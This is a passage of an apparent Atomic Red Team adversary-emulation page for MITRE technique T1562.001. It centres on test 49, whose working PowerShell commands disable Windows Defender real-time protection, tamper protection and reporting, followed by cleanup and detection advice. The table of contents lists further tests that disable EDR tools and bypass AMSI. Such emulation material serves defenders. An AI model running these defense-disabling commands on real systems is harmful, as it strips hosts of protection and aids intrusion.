reg add &quot;HKLM\software\microsoft\windows defender\spynet&quot; /v &quot;SubmitSamplesConsent&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Microsoft\Windows Defender&quot; /v &quot;PUAProtection&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">48</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-49-tamper-with-windows-defender-registry-powershelldisable-windows-defender-by-tampering-with-windows-defender-registry-through-powershell">
<h3>Atomic Test #49 - Tamper with Windows Defender Registry - PowershellDisable Windows Defender by tampering with windows defender registry through powershell<a class="headerlink" href="#atomic-test-49-tamper-with-windows-defender-registry-powershelldisable-windows-defender-by-tampering-with-windows-defender-registry-through-powershell" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableAntiSpyware&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableAntiVirus&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableBehaviorMonitoring&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableIntrusionPreventionSystem&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableIOAVProtection&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableOnAccessProtection&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableRealtimeMonitoring&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableScanOnRealtimeEnable&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableScriptScanning&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableEnhancedNotifications&quot;</span> <span class="n">-Value</span> <span class="n">1</span>  
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableBlockAtFirstSeen&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;SpynetReporting&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;MpEnablePus&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisallowExploitProtectionOverride&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows Defender\Features&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;TamperProtection&quot;</span>  <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\software\microsoft\windows defender\spynet&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;SubmitSamplesConsent&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;PUAProtection&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">49</span>
</pre></div>
</div>
</div>
</div>
<section id="id74">
<h4>Cleanup:<a class="headerlink" href="#id74" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableAntiSpyware&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableAntiVirus&quot;</span> <span class="n">-Value</span> <span class="n">0</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableBehaviorMonitoring&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableIntrusionPreventionSystem&quot;</span> <span class="n">-Value</span> <span class="n">0</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableIOAVProtection&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableOnAccessProtection&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableRealtimeMonitoring&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableScanOnRealtimeEnable&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableScriptScanning&quot;</span> <span class="n">-Value</span> <span class="n">0</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableEnhancedNotifications&quot;</span> <span class="n">-Value</span> <span class="n">0</span>  
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableBlockAtFirstSeen&quot;</span> <span class="n">-Value</span> <span class="n">0</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;SpynetReporting&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;MpEnablePus&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisallowExploitProtectionOverride&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows Defender\Features&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;TamperProtection&quot;</span>  <span class="n">-Value</span> <span class="n">1</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\software\microsoft\windows defender\spynet&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;SubmitSamplesConsent&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;PUAProtection&quot;</span> <span class="n">-Value</span> <span class="n">1</span> 
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">49</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
</section>
<section id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this heading">#</a></h2>
<p>Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.</p>
<p>Lack of expected log events may be suspicious.</p>
</section>
</section>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: ".net-powershell"
        },
        kernelOptions: {
            name: ".net-powershell",
            path: "./tactics/defense-evasion"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = '.net-powershell'</script>

                </article>
              

              
              
              
              
                <footer class="prev-next-footer">
                  
<div class="prev-next-area">
    <a class="left-prev"
       href="T1556.html"
       title="previous page">
      <i class="fa-solid fa-angle-left"></i>
      <div class="prev-next-info">
        <p class="prev-next-subtitle">previous</p>
        <p class="prev-next-title">T1556 - Modify Authentication Process</p>
      </div>
    </a>
    <a class="right-next"
       href="T1562.002.html"
       title="next page">
      <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">T1562.002 - Disable Windows Event Logging</p>
      </div>
      <i class="fa-solid fa-angle-right"></i>
    </a>
</div>
                </footer>
              
            </div>
            
            
              
                <div class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">


  <div class="sidebar-secondary-item">
  <div class="page-toc tocsection onthispage">
    <i class="fa-solid fa-list"></i> Contents
  </div>
  <nav class="bd-toc-nav page-toc">
    <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-tests">Atomic Tests</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-1-disable-syslog">Atomic Test #1 - Disable syslog</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-sh">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-package-with-rsyslog-must-be-on-system">Description: Package with rsyslog must be on system</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#check-prereq-commands">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#get-prereq-commands">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-sh">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#cleanup">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-2-disable-syslog-freebsd-disables-syslog-collection">Atomic Test #2 - Disable syslog (freebsd)Disables syslog collection</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id1">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-3-disable-cb-responsedisable-the-cb-response-service">Atomic Test #3 - Disable Cb ResponseDisable the Cb Response service</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-4-disable-selinux">Atomic Test #4 - Disable SELinux</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id2">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-selinux-must-be-installed">Description: SELinux must be installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id3">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id4">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id5">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id6">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-5-stop-crowdstrike-falcon-on-linuxstop-and-disable-crowdstrike-falcon-on-linux">Atomic Test #5 - Stop Crowdstrike Falcon on LinuxStop and disable Crowdstrike Falcon on Linux</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id7">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-6-disable-carbon-black-responsedisables-carbon-black-response">Atomic Test #6 - Disable Carbon Black ResponseDisables Carbon Black Response</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id8">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-7-disable-littlesnitchdisables-littlesnitch">Atomic Test #7 - Disable LittleSnitchDisables LittleSnitch</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id9">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-8-disable-opendns-umbrelladisables-opendns-umbrella">Atomic Test #8 - Disable OpenDNS UmbrellaDisables OpenDNS Umbrella</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id10">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-9-disable-macos-gatekeeperdisables-macos-gatekeeper">Atomic Test #9 - Disable macOS GatekeeperDisables macOS Gatekeeper</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id11">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-10-stop-and-unload-crowdstrike-falcon-on-macosstop-and-unload-crowdstrike-falcon-daemons-falcond-and-userdaemon-on-macos">Atomic Test #10 - Stop and unload Crowdstrike Falcon on macOSStop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id12">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-11-unload-sysmon-filter-driver">Atomic Test #11 - Unload Sysmon Filter Driver</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-powershell">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-must-be-downloaded">Description: Sysmon must be downloaded</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id13">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id14">Get Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-must-be-installed">Description: sysmon must be Installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id15">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id16">Get Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-filter-must-be-loaded">Description: sysmon filter must be loaded</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id17">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id18">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id19">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-12-uninstall-sysmon">Atomic Test #12 - Uninstall Sysmon</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id20">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-executable-must-be-available">Description: Sysmon executable must be available</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id21">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id22">Get Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id23">Description: Sysmon must be installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id24">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id25">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id26">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id27">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-13-amsi-bypass-amsi-initfailedany-easy-way-to-bypass-amsi-inspection-is-it-patch-the-dll-in-memory-setting-the-amsiinitfailed-function-to-true">Atomic Test #13 - AMSI Bypass - AMSI InitFailedAny easy way to bypass AMSI inspection is it patch the dll in memory setting the “amsiInitFailed” function to true.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id28">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-14-amsi-bypass-remove-amsi-provider-reg-keywith-administrative-rights-an-adversary-can-remove-the-amsi-provider-registry-key-in-hklm-software-microsoft-amsi-to-disable-amsi-inspection">Atomic Test #14 - AMSI Bypass - Remove AMSI Provider Reg KeyWith administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id29">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-15-disable-arbitrary-security-windows-servicewith-administrative-rights-an-adversary-can-disable-windows-services-related-to-security-products-this-test-requires-mcafeedlpagentservice-to-be-installed">Atomic Test #15 - Disable Arbitrary Security Windows ServiceWith administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id30">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-16-tamper-with-windows-defender-atp-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-upon-execution-virus-and-threat-protection-will-show-as-disabled">Atomic Test #16 - Tamper with Windows Defender ATP PowerShellAttempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id31">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-17-tamper-with-windows-defender-command-promptattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-these-commands-must-be-run-as-system-so-they-still-fail-as-administrator">Atomic Test #17 - Tamper with Windows Defender Command PromptAttempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id32">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-18-tamper-with-windows-defender-registrydisable-windows-defender-from-starting-after-a-reboot-upen-execution-if-the-computer-is-rebooted-the-entire-virus-and-threat-protection-window-in-settings-will-be">Atomic Test #18 - Tamper with Windows Defender RegistryDisable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id33">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-19-disable-microsoft-office-security-featuresgorgon-group-may-disable-office-security-features-so-that-their-code-can-run-upon-execution-an-external-document-will-not">Atomic Test #19 - Disable Microsoft Office Security FeaturesGorgon group may disable Office security features so that their code can run. Upon execution, an external document will not</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id34">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-20-remove-windows-defender-definition-filesremoving-definition-files-would-cause-atp-to-not-fire-for-antimalware-check-mpcmdrun-exe-man-page-for-info-on-all-arguments">Atomic Test #20 - Remove Windows Defender Definition FilesRemoving definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-21-stop-and-remove-arbitrary-security-windows-servicebeginning-with-powershell-6-0-the-stop-service-cmdlet-sends-a-stop-message-to-the-windows-service-controller-for-each-of-the-specified-services-the-remove-service-cmdlet-removes-a-windows-service-in-the-registry-and-in-the-service-database">Atomic Test #21 - Stop and Remove Arbitrary Security Windows ServiceBeginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-22-uninstall-crowdstrike-falcon-on-windowsuninstall-crowdstrike-falcon-if-the-windowssensor-exe-path-is-not-provided-as-an-argument-we-need-to-search-for-it-since-the-executable-is-located-in-a-folder-named-with-a-random-guid-we-need-to-identify-it-before-invoking-the-uninstaller">Atomic Test #22 - Uninstall Crowdstrike Falcon on WindowsUninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-23-tamper-with-windows-defender-evade-scanning-foldermalware-can-exclude-a-specific-path-from-being-scanned-and-evading-detection">Atomic Test #23 - Tamper with Windows Defender Evade Scanning -FolderMalware can exclude a specific path from being scanned and evading detection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id35">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-24-tamper-with-windows-defender-evade-scanning-extensionmalware-can-exclude-specific-extensions-from-being-scanned-and-evading-detection">Atomic Test #24 - Tamper with Windows Defender Evade Scanning -ExtensionMalware can exclude specific extensions from being scanned and evading detection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id36">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-25-tamper-with-windows-defender-evade-scanning-processmalware-can-exclude-specific-processes-from-being-scanned-and-evading-detection">Atomic Test #25 - Tamper with Windows Defender Evade Scanning -ProcessMalware can exclude specific processes from being scanned and evading detection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id37">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-26-office-365-disable-antiphishrule">Atomic Test #26 - office-365-Disable-AntiPhishRule</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id38">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-exchangeonlinemanagement-powershell-module-must-be-installed">Description: ExchangeOnlineManagement PowerShell module must be installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id39">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id40">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-powershell">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id41">Cleanup:</a></li>
</ul>
</li>
